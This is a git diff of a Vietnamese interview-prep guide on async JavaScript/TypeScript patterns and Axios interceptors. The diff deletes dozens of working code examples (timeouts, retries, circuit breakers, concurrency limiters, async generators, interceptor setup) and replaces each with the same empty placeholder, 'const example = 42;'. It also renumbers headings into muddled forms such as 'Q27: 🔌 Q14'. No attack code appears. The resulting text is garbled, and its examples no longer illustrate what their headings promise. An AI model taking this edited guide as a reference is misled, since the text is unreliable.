-    await delay(100);
-    
-    if (balance >= amount) {
-      balance -= amount;
-      console.log(`Withdrew ${amount}, balance: ${balance}`);
-    } else {
-      console.log('Insufficient funds');
-    }
-  } finally {
-    balanceMutex.unlock();
-  }
-}
-
-// ✅ GIẢI PHÁP 2: Queue pattern
-class WithdrawalQueue {
-  private queue: Array<() => Promise<void>> = [];
-  private processing = false;
-  
-  async add(fn: () => Promise<void>) {
-    this.queue.push(fn);
-    
-    if (!this.processing) {
-      await this.process();
-    }
-  }
-  
-  private async process() {
-    this.processing = true;
-    
-    while (this.queue.length > 0) {
-      const fn = this.queue.shift()!;
-      await fn();
-    }
-    
-    this.processing = false;
-  }
-}
-
-const withdrawalQueue = new WithdrawalQueue();
-
-async function withdrawQueued(amount: number) {
-  await withdrawalQueue.add(async () => {
-    await delay(100);
-    
-    if (balance >= amount) {
-      balance -= amount;
-      console.log(`Withdrew ${amount}, balance: ${balance}`);
-    } else {
-      console.log('Insufficient funds');
-    }
-  });
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -5482,217 +2070,16 @@ async function withdrawQueued(amount: number) {
 
 **🔹 Problem: Requests hang forever**
 
-```typescript
-// ❌ VẤN ĐỀ: Request không có timeout
-async function fetchData() {
-  const response = await fetch('/api/data'); // Hang forever nếu server không respond
-  return response.json();
-}
-
-// ✅ GIẢI PHÁP 1: Promise.race với timeout
-async function fetchWithTimeout<T>(
-  promise: Promise<T>,
-  timeoutMs: number
-): Promise<T> {
-  const timeoutPromise = new Promise<never>((_, reject) => {
-    setTimeout(() => reject(new Error('Timeout')), timeoutMs);
-  });
-  
-  return Promise.race([promise, timeoutPromise]);
-}
-
- // Chú giải: Usage
-try {
-  const data = await fetchWithTimeout(
-    fetch('/api/data').then(r => r.json()),
-    5000 // Chú giải: 5 seconds timeout
-  );
-  console.log('Data:', data);
-} catch (error) {
-  console.error('Request failed or timed out:', error);
-}
-
-// ✅ GIẢI PHÁP 2: AbortController với timeout
-async function fetchWithAbortTimeout(url: string, timeoutMs: number) {
-  const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
-  
-  try {
-    const response = await fetch(url, { signal: controller.signal });
-    clearTimeout(timeoutId);
-    return await response.json();
-  } catch (error: any) {
-    clearTimeout(timeoutId);
-    
-    if (error.name === 'AbortError') {
-      throw new Error('Request timeout');
-    }
-    throw error;
-  }
-}
-
-// ✅ GIẢI PHÁP 3: Reusable timeout wrapper
-function withTimeout<T>(
-  promise: Promise<T>,
-  timeoutMs: number,
-  errorMessage = 'Operation timeout'
-): Promise<T> {
-  return new Promise((resolve, reject) => {
-    const timeoutId = setTimeout(() => {
-      reject(new Error(errorMessage));
-    }, timeoutMs);
-    
-    promise
-      .then(result => {
-        clearTimeout(timeoutId);
-        resolve(result);
-      })
-      .catch(error => {
-        clearTimeout(timeoutId);
-        reject(error);
-      });
-  });
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔹 Problem: Network failures**
 
-```typescript
-// ❌ VẤN ĐỀ: Không có retry logic
-async function fetchData() {
-  const response = await fetch('/api/data');
-  return response.json(); // Fail ngay nếu network error
-}
-
-// ✅ GIẢI PHÁP 1: Retry với exponential backoff
-async function fetchWithRetry<T>(
-  fn: () => Promise<T>,
-  maxRetries = 3,
-  delayMs = 1000
-): Promise<T> {
-  let lastError: Error;
-  
-  for (let attempt = 0; attempt <= maxRetries; attempt++) {
-    try {
-      return await fn();
-    } catch (error) {
-      lastError = error as Error;
-      
-      if (attempt < maxRetries) {
- // Chú giải: Exponential backoff: 1s, 2s, 4s, 8s...
-        const delay = delayMs * Math.pow(2, attempt);
-        console.log(`Retry ${attempt + 1}/${maxRetries} after ${delay}ms`);
-        await new Promise(resolve => setTimeout(resolve, delay));
-      }
-    }
-  }
-  
-  throw lastError!;
-}
-
- // Chú giải: Usage
-const data = await fetchWithRetry(
-  () => fetch('/api/data').then(r => r.json()),
-  3,
-  1000
-);
-
-// ✅ GIẢI PHÁP 2: Retry với condition check
-async function fetchWithConditionalRetry<T>(
-  fn: () => Promise<T>,
-  shouldRetry: (error: Error) => boolean,
-  maxRetries = 3,
-  delayMs = 1000
-): Promise<T> {
-  let lastError: Error;
-  
-  for (let attempt = 0; attempt <= maxRetries; attempt++) {
-    try {
-      return await fn();
-    } catch (error) {
-      lastError = error as Error;
-      
-      // Chỉ retry nếu error có thể recover (network error, 503, etc.)
-      if (attempt < maxRetries && shouldRetry(lastError)) {
-        const delay = delayMs * Math.pow(2, attempt);
-        console.log(`Retrying after ${delay}ms...`);
-        await new Promise(resolve => setTimeout(resolve, delay));
-      } else {
-        break; // Không retry (4xx errors, etc.)
-      }
-    }
-  }
-  
-  throw lastError!;
-}
-
-// Usage: Chỉ retry network errors và 5xx errors
-const data = await fetchWithConditionalRetry(
-  () => fetch('/api/data').then(r => r.json()),
-  (error) => {
- // Chú giải: Retry network errors
-    if (error.message.includes('network')) return true;
-    
- // Chú giải: Retry 5xx server errors
-    if ('status' in error && (error as any).status >= 500) return true;
-    
- // Chú giải: Don't retry 4xx client errors
-    return false;
-  },
-  3,
-  1000
-);
-
-// ✅ GIẢI PHÁP 3: Advanced retry với circuit breaker
-class CircuitBreaker {
-  private failures = 0;
-  private lastFailureTime = 0;
-  private state: 'CLOSED' | 'OPEN' | 'HALF_OPEN' = 'CLOSED';
-  
-  constructor(
-    private threshold = 5,
-    private timeout = 60000 // Chú giải: 60s
-  ) {}
-  
-  async execute<T>(fn: () => Promise<T>): Promise<T> {
-    if (this.state === 'OPEN') {
- // Chú giải: Check if timeout passed
-      if (Date.now() - this.lastFailureTime > this.timeout) {
-        this.state = 'HALF_OPEN';
-      } else {
-        throw new Error('Circuit breaker is OPEN');
-      }
-    }
-    
-    try {
-      const result = await fn();
-      
- // Chú giải: Success → reset
-      if (this.state === 'HALF_OPEN') {
-        this.state = 'CLOSED';
-      }
-      this.failures = 0;
-      
-      return result;
-    } catch (error) {
-      this.failures++;
-      this.lastFailureTime = Date.now();
-      
-      if (this.failures >= this.threshold) {
-        this.state = 'OPEN';
-        console.error('Circuit breaker opened!');
-      }
-      
-      throw error;
-    }
-  }
-}
-
-const breaker = new CircuitBreaker(5, 60000);
-
-async function fetchWithCircuitBreaker() {
-  return breaker.execute(() => fetch('/api/data').then(r => r.json()));
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -5701,120 +2088,9 @@ async function fetchWithCircuitBreaker() {
 
 **🔹 Problem: Too many concurrent requests**
 
-```typescript
-// ❌ VẤN ĐỀ: Process 1000 items concurrently
-async function processAllItems(items: any[]) {
-  const results = await Promise.all(
-    items.map(item => processItem(item)) // Chú giải: 1000 concurrent requests! 💥
-  );
-  return results;
-}
-
-// ✅ GIẢI PHÁP 1: Batch processing
-async function processInBatches<T, R>(
-  items: T[],
-  batchSize: number,
-  processFn: (item: T) => Promise<R>
-): Promise<R[]> {
-  const results: R[] = [];
-  
-  for (let i = 0; i < items.length; i += batchSize) {
-    const batch = items.slice(i, i + batchSize);
-    const batchResults = await Promise.all(batch.map(processFn));
-    results.push(...batchResults);
-    
-    console.log(`Processed ${Math.min(i + batchSize, items.length)}/${items.length}`);
-  }
-  
-  return results;
-}
-
- // Chú giải: Usage: Process 100 items per batch
-const results = await processInBatches(items, 100, processItem);
-
-// ✅ GIẢI PHÁP 2: Concurrency limit với p-limit pattern
-class ConcurrencyLimiter {
-  private queue: Array<() => Promise<any>> = [];
-  private running = 0;
-  
-  constructor(private limit: number) {}
-  
-  async run<T>(fn: () => Promise<T>): Promise<T> {
-    while (this.running >= this.limit) {
-      await new Promise(resolve => setTimeout(resolve, 10));
-    }
-    
-    this.running++;
-    
-    try {
-      return await fn();
-    } finally {
-      this.running--;
-    }
-  }
-}
-
-const limiter = new ConcurrencyLimiter(10); // Chú giải: Max 10 concurrent
-
-async function processAllItemsWithLimit(items: any[]) {
-  const results = await Promise.all(
-    items.map(item => limiter.run(() => processItem(item)))
-  );
-  return results;
-}
-
-// ✅ GIẢI PHÁP 3: Queue với worker pool
-class WorkerPool<T, R> {
-  private queue: T[] = [];
-  private workers: number = 0;
-  private results: R[] = [];
-  private resolvePromise?: (value: R[]) => void;
-  
-  constructor(
-    private maxWorkers: number,
-    private processFn: (item: T) => Promise<R>
-  ) {}
-  
-  async process(items: T[]): Promise<R[]> {
-    this.queue = [...items];
-    this.results = [];
-    
-    return new Promise((resolve) => {
-      this.resolvePromise = resolve;
-      
- // Chú giải: Start workers
-      for (let i = 0; i < Math.min(this.maxWorkers, items.length); i++) {
-        this.startWorker();
-      }
-    });
-  }
-  
-  private async startWorker() {
-    this.workers++;
-    
-    while (this.queue.length > 0) {
-      const item = this.queue.shift()!;
-      
-      try {
-        const result = await this.processFn(item);
-        this.results.push(result);
-      } catch (error) {
-        console.error('Worker error:', error);
-      }
-    }
-    
-    this.workers--;
-    
- // Chú giải: All workers done?
-    if (this.workers === 0 && this.resolvePromise) {
-      this.resolvePromise(this.results);
-    }
-  }
-}
-
- // Chú giải: Usage
-const pool = new WorkerPool(5, processItem); // Chú giải: 5 workers
-const results = await pool.process(items);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -5823,13 +2099,9 @@ const results = await pool.process(items);
 
 **🔹 Problem: Promise.all chạy SONG SONG, không theo thứ tự**
 
-```typescript
-// ❌ Promise.all chạy ĐỒNG THỜI
-const results = await Promise.all(
-  items.map(item => processItem(item))
-);
-// ⚠️ TẤT CẢ chạy cùng lúc! Item 3 có thể xong trước item 1
-// ⚠️ Server có thể quá tải (1000 requests cùng lúc)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -5838,170 +2110,64 @@ const results = await Promise.all(
 
 #### **1. For...of Loop (Đơn giản nhất - Khuyến nghị) ⭐**
 
-```typescript
-// ✅ Chạy TUẦN TỰ - Đợi xong mới chạy tiếp
-async function processSequential(items: string[]) {
-  const results = [];
-  
-  for (const item of items) {
-    const result = await processItem(item);
-    results.push(result);
-  }
-  
-  return results;
-}
-
- // Chú giải: Example: API steps phụ thuộc nhau
-const step1 = await fetch('/api/validate').then(r => r.json());
-const step2 = await fetch('/api/upload', { 
-  headers: { token: step1.token } // Chú giải: Cần token từ step1
-}).then(r => r.json());
-const step3 = await fetch('/api/save', {
-  body: JSON.stringify({ fileId: step2.fileId }) // Chú giải: Cần fileId từ step2
-}).then(r => r.json());
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **2. Reduce Pattern**
 
-```typescript
- // Chú giải: Functional programming style
-const results = await items.reduce(async (prevPromise, item) => {
-  const acc = await prevPromise; // Đợi promise trước
-  const result = await processItem(item);
-  return [...acc, result];
-}, Promise.resolve([]));
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **3. Generator Pattern**
 
-```typescript
- // Chú giải: Real-time updates
-async function* processWithProgress(items: string[]) {
-  for (const item of items) {
-    const result = await processItem(item);
-    yield result; // Chú giải: Emit ngay khi xong
-  }
-}
-
-// Usage: Update UI từng kết quả
-for await (const result of processWithProgress(items)) {
-  updateUI(result); // Chú giải: Cập nhật ngay
-  console.log('Progress:', result);
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **4. Batched (Cân bằng Speed + Server Load)**
 
-```typescript
-// Xử lý 10 items/lần (giữa parallel và sequential)
-async function processBatched(items: string[], batchSize = 10) {
-  const results = [];
-  
-  for (let i = 0; i < items.length; i += batchSize) {
-    const batch = items.slice(i, i + batchSize);
-    const batchResults = await Promise.all(
-      batch.map(item => processItem(item))
-    );
-    results.push(...batchResults);
-  }
-  
-  return results;
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **📊 So Sánh Performance**
 
-```typescript
-// 5 items, mỗi item mất 1 giây
-
-// Promise.all (Parallel): ~1s (tất cả cùng lúc)
-await Promise.all(items.map(processItem));
-
-// for...of (Sequential): ~5s (từng cái một)
-for (const item of items) await processItem(item);
-
-// Batched (2 items/batch): ~3s (cân bằng)
-await processBatched(items, 2);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Bảng So Sánh:**
 
-```
-┌──────────────┬────────┬────────┬─────────────┬──────────────────┐
-│ Pattern      │ Speed  │ Order  │ Server Load │ Use Case         │
-├──────────────┼────────┼────────┼─────────────┼──────────────────┤
-│ Promise.all  │ ⚡⚡⚡⚡ │ ❌     │ 🔥🔥🔥🔥    │ Tasks độc lập    │
-│ for...of     │ ⚡     │ ✅     │ ✅          │ Tasks phụ thuộc  │
-│ generator    │ ⚡     │ ✅     │ ✅          │ Real-time update │
-│ batched      │ ⚡⚡⚡  │ ⚠️     │ ⚡⚡        │ Cân bằng        │
-└──────────────┴────────┴────────┴─────────────┴──────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **🎯 Real-World Examples**
 
-```typescript
- // Chú giải: Example 1: Multi-step Form (Phải theo thứ tự)
-async function submitForm(data: any) {
-  const validated = await fetch('/api/validate', { body: data });
-  const uploaded = await fetch('/api/upload', { headers: { token: validated.token } });
-  const saved = await fetch('/api/save', { body: { fileId: uploaded.fileId } });
-  return saved;
-}
-
-// Example 2: Rate-Limited API (1 request/giây)
-async function fetchWithRateLimit(urls: string[]) {
-  const results = [];
-  for (let i = 0; i < urls.length; i++) {
-    results.push(await fetch(urls[i]).then(r => r.json()));
-    if (i < urls.length - 1) await new Promise(r => setTimeout(r, 1000));
-  }
-  return results;
-}
-
-// Example 3: Database Migrations (Phải đúng thứ tự)
-for (const migration of migrations) {
-  await migration.up();
-  await db.log({ name: migration.name, date: Date.now() });
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **🚨 Common Mistakes**
 
-```typescript
-// ❌ LỖI 1: forEach không đợi async
-items.forEach(async (item) => {
-  await processItem(item); // ❌ forEach không đợi!
-});
-
-// ✅ ĐÚNG: Dùng for...of
-for (const item of items) {
-  await processItem(item);
-}
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-const results = items.map(async (item) => await processItem(item));
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-
-// ✅ ĐÚNG: Thêm Promise.all hoặc for...of
-const results = await Promise.all(items.map(processItem));
-
-// ❌ LỖI 3: reduce không await accumulator
-const results = items.reduce(async (acc, item) => {
-  acc.push(await processItem(item)); // ❌ acc là Promise!
-  return acc;
-}, []);
-
-// ✅ ĐÚNG: Await accumulator
-const results = await items.reduce(async (prevPromise, item) => {
-  const acc = await prevPromise; // Chú giải: ✅
-  return [...acc, await processItem(item)];
-}, Promise.resolve([]));
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -6010,26 +2176,9 @@ const results = await items.reduce(async (prevPromise, item) => {
 
 **Khi nào dùng gì?**
 
-```typescript
-// ✅ Tasks ĐỘC LẬP → Promise.all (parallel)
-const [users, posts, comments] = await Promise.all([
-  fetchUsers(),
-  fetchPosts(),
-  fetchComments()
-]);
-
- // Chú giải: ✅ Tasks PHỤ THUỘC → for...of (sequential)
-const token = await login();
-const data = await fetchData(token);
-const saved = await saveData(data);
-
- // Chú giải: ✅ Rate Limit / Server Load → Batched
-await processBatched(1000items, 50); // Chú giải: 50 items/lần
-
- // Chú giải: ✅ Real-time Updates → Generator
-for await (const progress of uploadFiles(files)) {
-  updateProgressBar(progress);
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -6038,200 +2187,18 @@ for await (const progress of uploadFiles(files)) {
 
 **🔹 Problem: Process large datasets**
 
-```typescript
-// ❌ VẤN ĐỀ: Load all data vào memory
-async function processAllUsers() {
-  const users = await fetchAllUsers(); // Chú giải: 1 million users! 💥
-  
-  for (const user of users) {
-    await processUser(user);
-  }
-}
-
-// ✅ GIẢI PHÁP 1: Async Generator
-async function* fetchUsersPaginated(pageSize = 100) {
-  let page = 0;
-  
-  while (true) {
-    const users = await fetch(`/api/users?page=${page}&size=${pageSize}`)
-      .then(r => r.json());
-    
-    if (users.length === 0) break;
-    
-    yield* users; // Chú giải: Yield each user
-    page++;
-  }
-}
-
- // Chú giải: Usage: Process one user at a time
-for await (const user of fetchUsersPaginated()) {
-  await processUser(user);
-  console.log(`Processed user ${user.id}`);
-}
-
-// ✅ GIẢI PHÁP 2: Stream processing
-async function processUsersStream() {
-  const stream = fetchUsersPaginated();
-  
-  for await (const user of stream) {
-    try {
-      await processUser(user);
-    } catch (error) {
-      console.error(`Failed to process user ${user.id}:`, error);
-      // Continue với user tiếp theo
-    }
-  }
-  
-  console.log('All users processed');
-}
-
-// ✅ GIẢI PHÁP 3: Transform stream
-async function* transformUsers(
-  source: AsyncIterable<User>,
-  transformFn: (user: User) => Promise<TransformedUser>
-) {
-  for await (const user of source) {
-    yield await transformFn(user);
-  }
-}
-
- // Chú giải: Usage: Chain transformations
-const userStream = fetchUsersPaginated();
-const enrichedStream = transformUsers(userStream, enrichUser);
-const validatedStream = transformUsers(enrichedStream, validateUser);
-
-for await (const user of validatedStream) {
-  console.log('Processed:', user);
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **🎯 Advanced Patterns - Tổng Hợp**
 
-```typescript
- // Chú giải: =====================================
- // Chú giải: ASYNC UTILS LIBRARY
- // Chú giải: =====================================
-
-class AsyncUtils {
- // Chú giải: 1. Retry với exponential backoff
-  static async retry<T>(
-    fn: () => Promise<T>,
-    options = { maxRetries: 3, delay: 1000, backoff: 2 }
-  ): Promise<T> {
-    let lastError: Error;
-    
-    for (let attempt = 0; attempt <= options.maxRetries; attempt++) {
-      try {
-        return await fn();
-      } catch (error) {
-        lastError = error as Error;
-        
-        if (attempt < options.maxRetries) {
-          const delay = options.delay * Math.pow(options.backoff, attempt);
-          await new Promise(resolve => setTimeout(resolve, delay));
-        }
-      }
-    }
-    
-    throw lastError!;
-  }
-  
- // Chú giải: 2. Timeout wrapper
-  static withTimeout<T>(
-    promise: Promise<T>,
-    timeoutMs: number
-  ): Promise<T> {
-    return Promise.race([
-      promise,
-      new Promise<never>((_, reject) => {
-        setTimeout(() => reject(new Error('Timeout')), timeoutMs);
-      }),
-    ]);
-  }
-  
- // Chú giải: 3. Debounced async function
-  static debounce<T extends (...args: any[]) => Promise<any>>(
-    fn: T,
-    delayMs: number
-  ): T {
-    let timeoutId: NodeJS.Timeout | null = null;
-    
-    return ((...args: any[]) => {
-      return new Promise((resolve, reject) => {
-        if (timeoutId) clearTimeout(timeoutId);
-        
-        timeoutId = setTimeout(() => {
-          fn(...args).then(resolve).catch(reject);
-        }, delayMs);
-      });
-    }) as T;
-  }
-  
- // Chú giải: 4. Parallel với concurrency limit
-  static async parallel<T, R>(
-    items: T[],
-    fn: (item: T) => Promise<R>,
-    concurrency: number
-  ): Promise<R[]> {
-    const results: R[] = [];
-    const executing: Promise<void>[] = [];
-    
-    for (const item of items) {
-      const promise = fn(item).then(result => {
-        results.push(result);
-      });
-      
-      executing.push(promise);
-      
-      if (executing.length >= concurrency) {
-        await Promise.race(executing);
-        executing.splice(executing.findIndex(p => p === promise), 1);
-      }
-    }
-    
-    await Promise.all(executing);
-    return results;
-  }
-  
- // Chú giải: 5. Sleep utility
-  static sleep(ms: number): Promise<void> {
-    return new Promise(resolve => setTimeout(resolve, ms));
-  }
-}
-
- // Chú giải: =====================================
- // Chú giải: USAGE EXAMPLES
- // Chú giải: =====================================
-
- // Chú giải: Retry API call
-const data = await AsyncUtils.retry(
-  () => fetch('/api/data').then(r => r.json()),
-  { maxRetries: 3, delay: 1000, backoff: 2 }
-);
-
- // Chú giải: Timeout request
-const user = await AsyncUtils.withTimeout(
-  fetch('/api/user').then(r => r.json()),
-  5000
-);
-
- // Chú giải: Debounced search
-const debouncedSearch = AsyncUtils.debounce(
-  async (term: string) => {
-    const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
-    displayResults(results);
-  },
-  300
-);
-
- // Chú giải: Process với concurrency limit
-const results = await AsyncUtils.parallel(
-  items,
-  processItem,
-  10 // Chú giải: Max 10 concurrent
-);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -6269,47 +2236,23 @@ Async programming phức tạp hơn sync nhiều do:
 
 **📌 Promise Combinators Examples:**
 
-```typescript
-// Promise.all - tất cả phải thành công
-const [users, posts, comments] = await Promise.all([
-  fetch('/api/users').then(r => r.json()),
-  fetch('/api/posts').then(r => r.json()),
-  fetch('/api/comments').then(r => r.json())
-]);
-
-// Promise.any - 1 thành công là đủ (fallback)
-const data = await Promise.any([
-  fetch('/api/primary'),
-  fetch('/api/backup1'),
-  fetch('/api/backup2')
-]);
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-const result = await Promise.race([
-  fetch('/api/data'),
-  new Promise((_, reject) => setTimeout(() => reject('Timeout'), 5000))
-]);
-
-// Promise.allSettled - đợi tất cả complete
-const results = await Promise.allSettled([
-  fetch('/api/1'),
-  fetch('/api/2'),
-  fetch('/api/3')
-]);
- // Chú giải: results = [{ status: 'fulfilled', value: ... }, { status: 'rejected', reason: ... }]
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 Nhưng với đúng patterns và tools, bạn có thể xử lý mọi tình huống async một cách hiệu quả! 🚀
 
 ---
 ---
-## 14. 🔌 Q14: Axios Interceptors - Phân Tích Chi Tiết & Tối Ưu Hóa  
 
-**P1: Tên câu hỏi:** 🔌 Q14: Axios Interceptors - Phân Tích Chi Tiết & Tối Ưu Hóa  
+## 27. Q27: 🔌 Q14: Axios Interceptors - Phân Tích Chi Tiết & Tối Ưu Hóa
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔌 Q14: Axios Interceptors - Phân Tích Chi Tiết & Tối Ưu Hóa
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 28. Q28: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -6348,9 +2291,6 @@ Nhưng với đúng patterns và tools, bạn có thể xử lý mọi tình hu�
 - Interceptor return Promise → có thể **async/await** bên trong
 - Eject interceptor: `const id = axios.interceptors.request.use(...); axios.interceptors.request.eject(id)`
 - Best practice: Tạo **separate axios instances** cho từng service (auth API, data API) với different interceptors
-
-
-
 
 **⚡ Quick Summary:**
 > Interceptors = middleware cho request/response. Transform data, add headers, handle errors
@@ -6392,435 +2332,9 @@ Nhưng với đúng patterns và tools, bạn có thể xử lý mọi tình hu�
 
 **Code Example - Comprehensive Implementation:**
 
-```typescript
-import axios, {
-  AxiosInstance,
-  AxiosRequestConfig,
-  AxiosResponse,
-  AxiosError,
-  InternalAxiosRequestConfig,
-} from 'axios';
-
- // Chú giải: ============================================
- // Chú giải: 1. BASE CONFIGURATION - Tạo axios instance
- // Chú giải: ============================================
-const apiClient: AxiosInstance = axios.create({
-  baseURL: process.env.REACT_APP_API_URL || 'https: // Chú giải: api.example.com',
-  timeout: 10000, // Chú giải: 10 seconds timeout
-  headers: {
-    'Content-Type': 'application/json',
-  },
-});
-
- // Chú giải: ============================================
- // Chú giải: 2. REQUEST INTERCEPTOR - Authentication & Logging
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Request interceptor chạy TRƯỚC KHI request được gửi đi
- * - Thứ tự: Interceptor được add SAU CÙNG sẽ chạy TRƯỚC (LIFO)
- * - Có thể modify config: headers, params, data, timeout...
- */
-apiClient.interceptors.request.use(
-  (config: InternalAxiosRequestConfig) => {
- // Chú giải: 🔐 Add Authentication Token
-    const token = localStorage.getItem('accessToken');
-    if (token && config.headers) {
-      config.headers.Authorization = `Bearer ${token}`;
-    }
-
- // Chú giải: 📝 Add Request ID for tracking (useful for debugging)
-    const requestId = `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-    if (config.headers) {
-      config.headers['X-Request-ID'] = requestId;
-    }
-
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
-    (config as any).metadata = { startTime: new Date().getTime() };
-
- // Chú giải: 📊 Logging (chỉ trong development)
-    if (process.env.NODE_ENV === 'development') {
-      console.log(`🚀 [${config.method?.toUpperCase()}] ${config.url}`, {
-        headers: config.headers,
-        params: config.params,
-        data: config.data,
-      });
-    }
-
-    return config;
-  },
-  (error: AxiosError) => {
- // Chú giải: Handle request error (e.g., network down before request sent)
-    console.error('❌ Request Error:', error.message);
-    return Promise.reject(error);
-  }
-);
-
- // Chú giải: ============================================
- // Chú giải: 3. RESPONSE INTERCEPTOR - Success Handling
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Response interceptor chạy SAU KHI nhận response từ server
- * - Thứ tự: Interceptor được add TRƯỚC sẽ chạy TRƯỚC (FIFO)
- * - Có thể transform response data trước khi return về caller
- */
-apiClient.interceptors.response.use(
-  (response: AxiosResponse) => {
- // Chú giải: ⏱️ Calculate request duration
-    const duration = new Date().getTime() - (response.config as any).metadata?.startTime;
-
- // Chú giải: 📊 Log response (development only)
-    if (process.env.NODE_ENV === 'development') {
-      console.log(`✅ [${response.config.method?.toUpperCase()}] ${response.config.url}`, {
-        status: response.status,
-        duration: `${duration}ms`,
-        data: response.data,
-      });
-    }
-
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
-    if (duration > 3000) {
- // Chú giải: Alert if request takes > 3 seconds
-      console.warn(`⚠️ Slow request detected: ${response.config.url} (${duration}ms)`);
- // Chú giải: sendToMonitoringService({ url: response.config.url, duration });
-    }
-
- // Chú giải: 🔄 Transform response data (e.g., snake_case → camelCase)
- // Chú giải: response.data = transformKeys(response.data, 'camelCase');
-
-    return response;
-  },
-  async (error: AxiosError) => {
- // Chú giải: ============================================
- // Chú giải: ERROR HANDLING - Comprehensive error management
- // Chú giải: ============================================
-    const originalRequest = error.config as any;
-
- // Chú giải: 📊 Log error details
-    console.error('❌ Response Error:', {
-      url: originalRequest?.url,
-      method: originalRequest?.method,
-      status: error.response?.status,
-      message: error.message,
-    });
-
- // Chú giải: 🔄 Case 1: RETRY LOGIC - Auto retry on network errors
-    if (!error.response && originalRequest && !originalRequest._retry) {
-      originalRequest._retry = true;
-      originalRequest._retryCount = (originalRequest._retryCount || 0) + 1;
-
-      if (originalRequest._retryCount <= 3) {
- // Chú giải: Maximum 3 retries
-        console.log(`🔄 Retrying request (${originalRequest._retryCount}/3)...`);
-        await new Promise((resolve) => setTimeout(resolve, 1000 * originalRequest._retryCount)); // Chú giải: Exponential backoff
-        return apiClient(originalRequest);
-      }
-    }
-
- // Chú giải: 🔐 Case 2: TOKEN REFRESH - 401 Unauthorized
-    if (error.response?.status === 401 && originalRequest && !originalRequest._retry) {
-      originalRequest._retry = true;
-
-      try {
- // Chú giải: Attempt to refresh token
-        const refreshToken = localStorage.getItem('refreshToken');
-        const response = await axios.post('/auth/refresh', { refreshToken });
-
-        const { accessToken, refreshToken: newRefreshToken } = response.data;
-
- // Chú giải: Save new tokens
-        localStorage.setItem('accessToken', accessToken);
-        localStorage.setItem('refreshToken', newRefreshToken);
-
- // Chú giải: Retry original request with new token
-        if (originalRequest.headers) {
-          originalRequest.headers.Authorization = `Bearer ${accessToken}`;
-        }
-
-        console.log('🔐 Token refreshed successfully, retrying original request...');
-        return apiClient(originalRequest);
-      } catch (refreshError) {
- // Chú giải: Refresh failed → logout user
-        console.error('❌ Token refresh failed, logging out...');
-        localStorage.clear();
-        window.location.href = '/login';
-        return Promise.reject(refreshError);
-      }
-    }
-
- // Chú giải: 🚫 Case 3: FORBIDDEN - 403 (No permission)
-    if (error.response?.status === 403) {
-      console.error('🚫 Access Forbidden - You do not have permission');
- // Chú giải: Show toast notification or redirect
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    }
-
- // Chú giải: ⚠️ Case 4: NOT FOUND - 404
-    if (error.response?.status === 404) {
-      console.error('⚠️ Resource not found');
- // Chú giải: Handle 404 error (e.g., redirect to 404 page)
-    }
-
- // Chú giải: 🔥 Case 5: SERVER ERROR - 500+
-    if (error.response?.status && error.response.status >= 500) {
-      console.error('🔥 Server Error - Please try again later');
- // Chú giải: Show user-friendly error message
- // Chú giải: toast.error('Server error occurred. Please try again later.');
-    }
-
- // Chú giải: 🌐 Case 6: NETWORK ERROR - No response from server
-    if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-      console.error('⏱️ Request Timeout - Check your connection');
- // Chú giải: toast.error('Request timeout. Please check your internet connection.');
-    }
-
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-    return Promise.reject({
-      message: error.response?.data?.message || error.message,
-      status: error.response?.status,
-      data: error.response?.data,
-    });
-  }
-);
-
- // Chú giải: ============================================
- // Chú giải: 4. ADVANCED: MULTIPLE INTERCEPTORS - Execution Order
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation về thứ tự execution:
- * 
- * Request Interceptors (LIFO - Last In First Out):
- * - Interceptor được add SAU CÙNG chạy TRƯỚC
- * - Example: Add interceptor 1 → Add interceptor 2 → Add interceptor 3
- * - Execution: 3 → 2 → 1 → Request sent
- * 
- * Response Interceptors (FIFO - First In First Out):
- * - Interceptor được add TRƯỚC chạy TRƯỚC
